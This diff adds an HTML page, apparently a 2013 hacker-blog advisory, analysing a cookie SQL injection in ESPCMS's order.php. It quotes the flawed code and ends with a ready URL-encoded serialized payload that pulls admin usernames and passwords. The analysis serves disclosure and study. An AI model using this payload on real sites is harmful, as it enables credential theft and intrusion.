@@ -1,0 +1,91 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>ESPCMS COOKIE注入与分析 - Hackersoul.com</title>
+  <meta name="keywords" content="HackerSoul,FF0000TEAM,ESPCMS漏洞">
+  <link rel="stylesheet" type="text/css" href="/css/bootstrap.min.css">
+  <link rel="stylesheet" type="text/css" href="/css/hackersoul.css">
+  <link rel="shortcut icon" href="favicon.ico" type=image/x-icon>
+</head>
+
+<body>
+  <div class="header">
+    <img src="/img/hs_header.jpg" class="header-bg">
+  </div>
+  <div class="narrow-board">
+    <a class="logo-container" href="/" title="一个有情怀的黑客博客">
+      <img src="/img/hs_logo.png" class="logo">
+      <div class="slogan">Enjoy hacking, Enjoy life.</div>
+    </a>
+
+    <div class="post">
+      <pre>
+      <xmp>                           
+                     	   .::ESPCMS COOKIE注入与分析::.
+
+                    We enjoy hacking of life in day and night.
+
+                _______________________________________________
+				
+                  [+] HSID: FF000-HSDB-0003
+                  [+] Author: Kavia <kavia#ff0000.cc>
+                  [+] Team: FF0000 TEAM <http://www.ff0000.cc>
+                  [+] From: HackerSoul <http://www.hackersoul.com>
+                  [+] Create: 2013-04-04
+                _______________________________________________
+
+
+                                  -= Main =-
+
+文件：/espcms/interface/order.php
+
+=======================
+function in_list() {
+    parent::start_pagetemplate();
+    $lng = (admin_LNG == 'big5') ? $this->CON['is_lancode'] : admin_LNG;
+
+    //接收cookies[‘ecisp_order_list’]
+    $cartid = $this->fun->accept('ecisp_order_list', 'C');
+    $cartid = stripslashes(htmlspecialchars_decode($cartid));
+
+    //$cartid有特殊的格式要求
+    $uncartid = !empty($cartid) ? unserialize($cartid) : 0;
+
+    if ($uncartid && is_array($uncartid)) {
+        $didarray = $this->fun->key_array_name($uncartid, 'did', 'amount');
+        $didlist = $this->fun->format_array_text(array_keys($didarray), ',');
+
+        if (!empty($didlist)) {
+            $db_table = db_prefix . 'document';
+            $db_where = "isclass=1 AND isorder=1 AND did in($didlist) ORDER BY did DESC";
+            $sql="SELECT did,lng,pid,mid,aid,tid,sid,fgid,linkdid,isclass,islink,ishtml,ismess,isorder,purview,recommend,tsn,title,longtitle,color,author,source,pic,link,oprice,bprice,click,addtime,template,filename,filepath FROM $db_table WHERE $db_where";   //动态构造sql语句
+            $rs = $this->db->query($sql);  //直接带入查询
+=======================
+
+直接获取cookies[‘ecisp_order_list’]的值，没有经过过滤，直接被用来构造了sql语句，并带入了查询。所以此处形成了一个cookie注入。
+
+接收到的cookies[‘ecisp_order_list’]在整个传递过程中，经过了htmlspecialchars_decode()、stripslashes()、unserialize()、key_array_name()、array_keys()、format_array_text()几个函数。
+
+其中stripslashes()使得注入语句可以无视GPC的影响。
+
+但是，由于unserialize()的使用，使得构造exp的难度加大；因为传入unserialize()的值，必须使用一种规定的特殊格式（实施上，我也没有完全吃透这个特殊格式）
+
+
+EXP：
+a%3a1%3a%7bs%3a3%3a%22k23%22%3ba%3a2%3a%7bs%3a3%3a%22did%22%3bs%3a159%3a%2224)+and+1%3d2+union+select+1%2c2%2c3%2c4%2c5%2c6%2c7%2c8%2c9%2c10%2c11%2c12%2c13%2c14%2c15%2c16%2cpassword%2cusername%2c19%2c20%2c21%2c22%2c23%2c24%2c25%2c26%2c27%2c28%2c29%2c30%2c31+from+espcms_admin_member+where+1+in+(1%22%3bs%3a6%3a%22amount%22%3bi%3a1%3b%7d%7d
+
+FIX:
+官方最新版本
+
+                                  -= END =-
+      </xmp>
+      </pre>
+    </div>
+
+    <div class="footer">
+	<span class="copy">&copy;&nbsp;</span>2014 FF0000 TeAm. <a href="/about.html" class="red-link">About Us</a>
+    </div>
+  </div>
+</body>
+</html>
